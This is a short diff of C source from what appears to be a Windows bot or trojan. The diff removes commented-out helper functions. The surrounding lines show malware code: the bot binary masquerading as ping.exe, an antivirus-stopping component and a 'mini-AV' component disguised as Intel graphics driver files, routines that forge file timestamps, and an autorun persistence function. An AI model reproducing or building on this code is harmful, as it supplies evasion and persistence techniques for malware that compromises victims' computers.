@@ -5,14 +5,7 @@
 #include "BotCore.h"
 
 
-
-//igfxtray.exe
-//igfxtray.dat
-
 WCHAR BOT_FILE_NAME[] = {'\\','p','i','n','g','.','e','x','e',0};
-
-//igxpdv32.dat
-//igxpgd32.dat
 
 WCHAR BOT_STOPAV_NAME[] = {'\\','i','g','x','p','d','v','3','2','.','d','a','t', 0};
 WCHAR BOT_MINIAV_NAME[] = {'\\','i','g','x','p','g','d','3','2','.','d','a','t', 0};
@@ -23,16 +16,6 @@ DWORD BOT_STAV_HASH = 0x551DD093;
 DWORD BOT_MNAV_HASH = 0x551B9893;
 
 
-//DWORD GetBotHash()
-//{
-//	return BOT_FILE_HASH;
-//}
-
-
-//DWORD GetCfgHash()
-//{
-//	return BOT_CFGN_HASH;
-//}
 
 WCHAR *GetShellFoldersKey( DWORD dwParam )
 {
@@ -110,30 +93,6 @@ void SetFakeFileDateTimeW(PWCHAR Path)
     SetFakeFileDateTime(FileName);
 	STR::Free(FileName);
 }
-
-//WCHAR BotFile[ 256 ];
-//
-//WCHAR *GetBotPath()
-//{
-//	if ( !m_wcslen( BotFile ) )
-//	{
-//		WCHAR *BotPath = GetShellFoldersKey(1);
-//
-//		if ( BotPath == NULL )
-//		{
-//			return NULL;
-//		}
-//
-//		plstrcatW( BotPath, BOT_FILE_NAME );
-//		plstrcpyW( BotFile, BotPath );
-//
-//		MemFree( BotPath );
-//	}
-//
-//	WCHAR *Ret = BotFile;
-//
-//	return Ret;
-//}
 
 
 void AddToAutoRun( WCHAR *TempFileName )
